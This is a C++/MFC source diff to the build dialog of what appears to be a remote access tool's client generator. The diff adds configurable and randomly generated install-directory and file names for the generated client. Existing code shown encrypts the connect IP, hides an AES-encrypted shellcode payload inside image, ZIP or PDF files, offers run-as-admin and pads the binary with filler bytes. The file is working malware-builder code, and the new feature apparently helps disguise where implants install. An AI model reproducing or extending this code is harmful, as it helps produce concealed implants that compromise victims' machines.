@@ -9,6 +9,7 @@
 #include "InputDlg.h"
 #include <bcrypt.h>
 #include <wincrypt.h>
+#include "Resource.h"
 // #include <ntstatus.h>
 
 enum Index {
@@ -71,6 +72,30 @@ LPBYTE ReadResource(int resourceId, DWORD &dwSize)
 }
 
 
+CString GenerateRandomName(int nLength)
+{
+    if (nLength <= 0) nLength = 8;
+
+    static const TCHAR szChars[] = _T("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789");
+    static const int nCharsCount = _countof(szChars) - 1;
+
+    static bool bSeeded = false;
+    if (!bSeeded) {
+        srand((unsigned)time(NULL));
+        bSeeded = true;
+    }
+
+    CString strName;
+    LPTSTR pBuf = strName.GetBuffer(nLength);
+
+    for (int i = 0; i < nLength; i++) {
+        pBuf[i] = szChars[rand() % nCharsCount];
+    }
+
+    strName.ReleaseBuffer(nLength);
+    return strName;
+}
+
 CBuildDlg::CBuildDlg(CWnd* pParent)
     : CDialog(CBuildDlg::IDD, pParent)
     , m_strIP(_T(""))
@@ -78,6 +103,8 @@ CBuildDlg::CBuildDlg(CWnd* pParent)
     , m_strFindden(FLAG_FINDEN)
     , m_sGroupName(_T("default"))
     , m_strEncryptIP(_T("是"))
+    , m_sInstallDir(_T(""))
+    , m_sInstallName(_T(""))
 {
 
 }
@@ -104,6 +131,12 @@ void CBuildDlg::DoDataExchange(CDataExchange* pDX)
     DDX_Control(pDX, IDC_COMBO_PAYLOAD, m_ComboPayload);
     DDX_Control(pDX, IDC_STATIC_PAYLOAD, m_StaticPayload);
     DDX_Control(pDX, IDC_SLIDER_CLIENT_SIZE, m_SliderClientSize);
+    DDX_Control(pDX, IDC_EDIT_INSTALL_DIR, m_EditInstallDir);
+    DDX_Control(pDX, IDC_EDIT_INSTALL_NAME, m_EditInstallName);
+    DDX_Text(pDX, IDC_EDIT_INSTALL_DIR, m_sInstallDir);
+    DDV_MaxChars(pDX, m_sInstallDir, 31);
+    DDX_Text(pDX, IDC_EDIT_INSTALL_NAME, m_sInstallName);
+    DDV_MaxChars(pDX, m_sInstallName, 31);
 }
 
 
@@ -115,7 +148,12 @@ BEGIN_MESSAGE_MAP(CBuildDlg, CDialog)
     ON_COMMAND(ID_MENU_ENCRYPT_IP, &CBuildDlg::OnMenuEncryptIp)
     ON_COMMAND(ID_CLIENT_RUNAS_ADMIN, &CBuildDlg::OnClientRunasAdmin)
     ON_CBN_SELCHANGE(IDC_COMBO_COMPRESS, &CBuildDlg::OnCbnSelchangeComboCompress)
-	ON_NOTIFY_EX(TTN_NEEDTEXT, 0, &CBuildDlg::OnToolTipNotify)
+    ON_NOTIFY_EX(TTN_NEEDTEXT, 0, &CBuildDlg::OnToolTipNotify)
+    ON_EN_CHANGE(IDC_EDIT_INSTALL_DIR, &CBuildDlg::OnEnChangeEditInstallDir)
+    ON_EN_CHANGE(IDC_EDIT_INSTALL_NAME, &CBuildDlg::OnEnChangeEditInstallName)
+    ON_EN_KILLFOCUS(IDC_EDIT_INSTALL_DIR, &CBuildDlg::OnEnKillfocusEditInstallDir)
+    ON_EN_KILLFOCUS(IDC_EDIT_INSTALL_NAME, &CBuildDlg::OnEnKillfocusEditInstallName)
+    ON_COMMAND(ID_RANDOM_NAME, &CBuildDlg::OnRandomName)
 END_MESSAGE_MAP()
 
 
@@ -182,17 +220,53 @@ void generate_random_iv(unsigned char* iv, size_t len)
 
 ULONGLONG GetFileSize(const char* path)
 {
-	std::ifstream file(path, std::ios::binary | std::ios::ate);
+    std::ifstream file(path, std::ios::binary | std::ios::ate);
 
-	if (!file) {
-		Mprintf("Failed to open file: %s.\n", path);
-		return 0;
-	}
+    if (!file) {
+        Mprintf("Failed to open file: %s.\n", path);
+        return 0;
+    }
 
-	ULONGLONG size = file.tellg();
-	file.close();
+    ULONGLONG size = file.tellg();
+    file.close();
 
-	return size;
+    return size;
+}
+
+bool IsValidFileName(const CString& strName)
+{
+    if (strName.IsEmpty()) return false;
+
+    // 检查非法字符
+    LPCTSTR szInvalidChars = _T("\\/:*?\"<>|");
+    if (strName.FindOneOf(szInvalidChars) != -1)
+        return false;
+
+    // 检查保留名称 (CON, PRN, AUX, NUL, COM1-9, LPT1-9)
+    CString strUpper = strName;
+    strUpper.MakeUpper();
+    int nDot = strUpper.Find(_T('.'));
+    CString strBase = (nDot != -1) ? strUpper.Left(nDot) : strUpper;
+
+    LPCTSTR szReserved[] = {
+        _T("CON"), _T("PRN"), _T("AUX"), _T("NUL"),
+        _T("COM1"), _T("COM2"), _T("COM3"), _T("COM4"), _T("COM5"),
+        _T("COM6"), _T("COM7"), _T("COM8"), _T("COM9"),
+        _T("LPT1"), _T("LPT2"), _T("LPT3"), _T("LPT4"), _T("LPT5"),
+        _T("LPT6"), _T("LPT7"), _T("LPT8"), _T("LPT9"), NULL
+    };
+
+    for (int i = 0; szReserved[i]; i++) {
+        if (strBase == szReserved[i])
+            return false;
+    }
+
+    // 不能以空格或点结尾
+    TCHAR chLast = strName[strName.GetLength() - 1];
+    if (chLast == _T(' ') || chLast == _T('.'))
+        return false;
+
+    return true;
 }
 
 void CBuildDlg::OnBnClickedOk()
@@ -282,6 +356,8 @@ void CBuildDlg::OnBnClickedOk()
     g_ConnectAddress.iHeaderEnc = m_ComboEncrypt.GetCurSel();
     memcpy(g_ConnectAddress.pwdHash, GetPwdHash().c_str(), sizeof(g_ConnectAddress.pwdHash));
     memcpy(g_ConnectAddress.szGroupName, m_sGroupName, m_sGroupName.GetLength());
+    memcpy(g_ConnectAddress.installDir, m_sInstallDir, m_sInstallDir.GetLength());
+    memcpy(g_ConnectAddress.installName, m_sInstallName, m_sInstallName.GetLength());
 
     if (!g_ConnectAddress.IsValid()) {
         SAFE_DELETE_ARRAY(szBuffer);
@@ -374,24 +450,24 @@ void CBuildDlg::OnBnClickedOk()
                             PathRenameExtension(strSeverFile.GetBuffer(MAX_PATH), _T(".exe"));
                             strSeverFile.ReleaseBuffer();
                             if (strSeverFile != old) DeleteFileA(old);
-							int n = m_ComboPayload.GetCurSel();
-							CString payload = strSeverFile;
-							if (n) {
-								static std::map<int, std::string> m = {
-									{ Payload_Raw, "*.bin|*.bin|"}, { Payload_BMP, "*.bmp|*.bmp|"},
-									{ Payload_JPG, "*.jpg|*.jpg|"}, { Payload_PNG, "*.png|*.png|"},
-									{ Payload_ZIP, "*.zip|*.zip|"}, { Payload_PDF, "*.pdf|*.pdf|"},
-								};
-								payload = GetFilePath(NULL, m[n].c_str(), n != Payload_Raw);
-								sc->offset = n == Payload_Raw ? 0 : GetFileSize(payload);
+                            int n = m_ComboPayload.GetCurSel();
+                            CString payload = strSeverFile;
+                            if (n) {
+                                static std::map<int, std::string> m = {
+                                    { Payload_Raw, "*.bin|*.bin|"}, { Payload_BMP, "*.bmp|*.bmp|"},
+                                    { Payload_JPG, "*.jpg|*.jpg|"}, { Payload_PNG, "*.png|*.png|"},
+                                    { Payload_ZIP, "*.zip|*.zip|"}, { Payload_PDF, "*.pdf|*.pdf|"},
+                                };
+                                payload = GetFilePath(NULL, m[n].c_str(), n != Payload_Raw);
+                                sc->offset = n == Payload_Raw ? 0 : GetFileSize(payload);
                                 strcpy(sc->file, PathFindFileNameA(payload));
-								tip = payload.IsEmpty() ? "\r\n警告: 没有生成载荷!" : "\r\n提示: 载荷文件必须拷贝至程序目录。";
-							}
+                                tip = payload.IsEmpty() ? "\r\n警告: 没有生成载荷!" : "\r\n提示: 载荷文件必须拷贝至程序目录。";
+                            }
                             BOOL r = WriteBinaryToFile(strSeverFile.GetString(), (char*)data, dwSize);
-                            if (r) {                               
-								r = WriteBinaryToFile(payload.GetString(), (char*)srcData, srcLen, n == Payload_Raw ? 0 : -1);
-								if (!r) tip = "\r\n警告: 生成载荷失败!";
-                            }else{
+                            if (r) {
+                                r = WriteBinaryToFile(payload.GetString(), (char*)srcData, srcLen, n == Payload_Raw ? 0 : -1);
+                                if (!r) tip = "\r\n警告: 生成载荷失败!";
+                            } else {
                                 MessageBox("文件生成失败: \r\n" + strSeverFile, "提示", MB_ICONINFORMATION);
                             }
                             SAFE_DELETE_ARRAY(srcData);
@@ -407,7 +483,7 @@ void CBuildDlg::OnBnClickedOk()
             }
             int size = m_SliderClientSize.GetPos() * 2.56 * 1024 * 1024;
             if (size > 0) {
-				std::vector<char> padding(size, time(0)%256);
+                std::vector<char> padding(size, time(0)%256);
                 WriteBinaryToFile(strSeverFile.GetString(), padding.data(), size, -1);
             }
             MessageBox("生成成功! 文件位于:\r\n" + strSeverFile + tip, "提示", MB_ICONINFORMATION);
@@ -497,27 +573,34 @@ BOOL CBuildDlg::OnInitDialog()
     ::SetMenu(this->GetSafeHwnd(), m_MainMenu.GetSafeHmenu()); // 为窗口设置菜单
     ::DrawMenuBar(this->GetSafeHwnd());                        // 显示菜单
 
+    BOOL b = THIS_CFG.GetInt("settings", "RandomName", 0);
+    if (b) {
+        m_EditInstallDir.SetWindowTextA(m_sInstallDir = GenerateRandomName(5 + time(0) % 10));
+        m_EditInstallName.SetWindowTextA(m_sInstallName = GenerateRandomName(5 + time(0) % 10));
+    }
+    SubMenu->CheckMenuItem(ID_RANDOM_NAME, b ? MF_CHECKED : MF_UNCHECKED);
+
     return TRUE;  // return TRUE unless you set the focus to a control
     // 异常: OCX 属性页应返回 FALSE
 }
 
-CString CBuildDlg::GetFilePath(CString type, CString filter, BOOL isOpen) {
-	CComPtr<IShellFolder> spDesktop;
-	HRESULT hr = SHGetDesktopFolder(&spDesktop);
-	if (FAILED(hr)) {
-		MessageBox("Explorer 未正确初始化! 请稍后再试。", "提示");
-		return "";
-	}
-	// 过滤器：显示所有文件和特定类型文件（例如文本文件）
-	CFileDialog fileDlg(isOpen, type, NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, filter, AfxGetMainWnd());
-	int ret = 0;
-	try {
-		ret = fileDlg.DoModal();
-	}
-	catch (...) {
-		MessageBox("文件对话框未成功打开! 请稍后再试。", "提示");
-		return "";
-	}
+CString CBuildDlg::GetFilePath(CString type, CString filter, BOOL isOpen)
+{
+    CComPtr<IShellFolder> spDesktop;
+    HRESULT hr = SHGetDesktopFolder(&spDesktop);
+    if (FAILED(hr)) {
+        MessageBox("Explorer 未正确初始化! 请稍后再试。", "提示");
+        return "";
+    }
+    // 过滤器：显示所有文件和特定类型文件（例如文本文件）
+    CFileDialog fileDlg(isOpen, type, NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, filter, AfxGetMainWnd());
+    int ret = 0;
+    try {
+        ret = fileDlg.DoModal();
+    } catch (...) {
+        MessageBox("文件对话框未成功打开! 请稍后再试。", "提示");
+        return "";
+    }
     if (ret == IDOK) {
         CString name = fileDlg.GetPathName();
         return name;
@@ -592,21 +675,135 @@ void CBuildDlg::OnClientRunasAdmin()
 void CBuildDlg::OnCbnSelchangeComboCompress()
 {
     m_ComboPayload.ShowWindow(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES ? SW_SHOW : SW_HIDE);
-	m_StaticPayload.ShowWindow(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES ? SW_SHOW : SW_HIDE);
+    m_StaticPayload.ShowWindow(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES ? SW_SHOW : SW_HIDE);
 }
 
 BOOL CBuildDlg::OnToolTipNotify(UINT id, NMHDR* pNMHDR, LRESULT* pResult)
 {
     TOOLTIPTEXTA* pTTT = (TOOLTIPTEXTA*)pNMHDR;
     UINT nID = pNMHDR->idFrom;
-	if (pTTT->uFlags & TTF_IDISHWND) {
+    if (pTTT->uFlags & TTF_IDISHWND) {
         // idFrom is actually the HWND of the tool
         nID = ::GetDlgCtrlID((HWND)nID);
     }
     if (nID == IDC_SLIDER_CLIENT_SIZE) {
-		int size = m_SliderClientSize.GetPos() * 2.56;
+        int size = m_SliderClientSize.GetPos() * 2.56;
         sprintf_s(pTTT->szText, "%dM", size);
         return TRUE;
-	}
+    }
     return FALSE;
+}
+
+
+void CBuildDlg::OnEnChangeEditInstallDir()
+{
+    static bool bProcessing = false;
+    if (bProcessing) return;
+    bProcessing = true;
+
+    CString strText;
+    GetDlgItemText(IDC_EDIT_INSTALL_DIR, strText);
+
+    // Windows 文件名非法字符: \ / : * ? " < > |
+    LPCTSTR szInvalidChars = _T("\\/:*?\"<>|");  // 纯文件名
+
+    bool bModified = false;
+    for (int i = strText.GetLength() - 1; i >= 0; i--) {
+        if (_tcschr(szInvalidChars, strText[i]) != NULL) {
+            strText.Delete(i);
+            bModified = true;
+        }
+    }
+
+    if (bModified) {
+        CEdit* pEdit = (CEdit*)GetDlgItem(IDC_EDIT_INSTALL_DIR);
+        int nSel = pEdit->GetSel() & 0xFFFF;  // 获取光标位置
+        SetDlgItemText(IDC_EDIT_INSTALL_DIR, strText);
+        pEdit->SetSel(nSel - 1, nSel - 1);  // 恢复光标
+    }
+
+    bProcessing = false;
+}
+
+
+void CBuildDlg::OnEnChangeEditInstallName()
+{
+    static bool bProcessing = false;
+    if (bProcessing) return;
+    bProcessing = true;
+
+    CString strText;
+    GetDlgItemText(IDC_EDIT_INSTALL_NAME, strText);
+
+    // Windows 文件名非法字符: \ / : * ? " < > |
+    LPCTSTR szInvalidChars = _T("\\/:*?\"<>|");  // 纯文件名
+
+    bool bModified = false;
+    for (int i = strText.GetLength() - 1; i >= 0; i--) {
+        if (_tcschr(szInvalidChars, strText[i]) != NULL) {
+            strText.Delete(i);
+            bModified = true;
+        }
+    }
+
+    if (bModified) {
+        CEdit* pEdit = (CEdit*)GetDlgItem(IDC_EDIT_INSTALL_NAME);
+        int nSel = pEdit->GetSel() & 0xFFFF;  // 获取光标位置
+        SetDlgItemText(IDC_EDIT_INSTALL_NAME, strText);
+        pEdit->SetSel(nSel - 1, nSel - 1);  // 恢复光标
+    }
+
+    bProcessing = false;
+}
+
+
+void CBuildDlg::OnEnKillfocusEditInstallDir()
+{
+    CString strText;
+    GetDlgItemText(IDC_EDIT_INSTALL_DIR, strText);
+
+    if (strText.IsEmpty()) return;
+
+    if (!IsValidFileName(strText)) {
+        MessageBoxA(_T("文件名不合法，请检查：\n")
+                    _T("1. 不能包含 \\ / : * ? \" < > |\n")
+                    _T("2. 不能是系统保留名称 (CON, PRN 等)\n")
+                    _T("3. 不能以空格或点结尾"), "提示", MB_ICONWARNING);
+
+        GetDlgItem(IDC_EDIT_INSTALL_DIR)->SetFocus();
+        ((CEdit*)GetDlgItem(IDC_EDIT_INSTALL_DIR))->SetWindowTextA("");
+        ((CEdit*)GetDlgItem(IDC_EDIT_INSTALL_DIR))->SetSel(0, -1);
+    }
+}
+
+
+void CBuildDlg::OnEnKillfocusEditInstallName()
+{
+    CString strText;
+    GetDlgItemText(IDC_EDIT_INSTALL_NAME, strText);
+
+    if (strText.IsEmpty()) return;
+
+    if (!IsValidFileName(strText)) {
+        MessageBoxA(_T("文件名不合法，请检查：\n")
+                    _T("1. 不能包含 \\ / : * ? \" < > |\n")
+                    _T("2. 不能是系统保留名称 (CON, PRN 等)\n")
+                    _T("3. 不能以空格或点结尾"), "提示", MB_ICONWARNING);
+
+        GetDlgItem(IDC_EDIT_INSTALL_NAME)->SetFocus();
+        ((CEdit*)GetDlgItem(IDC_EDIT_INSTALL_NAME))->SetWindowTextA("");
+        ((CEdit*)GetDlgItem(IDC_EDIT_INSTALL_NAME))->SetSel(0, -1);
+    }
+}
+
+
+void CBuildDlg::OnRandomName()
+{
+    BOOL b = !THIS_CFG.GetInt("settings", "RandomName", 0);
+    m_EditInstallDir.SetWindowTextA(m_sInstallDir = b ? GenerateRandomName(5 + time(0) % 10) : "");
+    m_EditInstallName.SetWindowTextA(m_sInstallName = b ? GenerateRandomName(5 + time(0) % 10) : "");
+
+    CMenu* SubMenu = m_MainMenu.GetSubMenu(0);
+    SubMenu->CheckMenuItem(ID_RANDOM_NAME, b ? MF_CHECKED : MF_UNCHECKED);
+    THIS_CFG.SetInt("settings", "RandomName", b);
 }
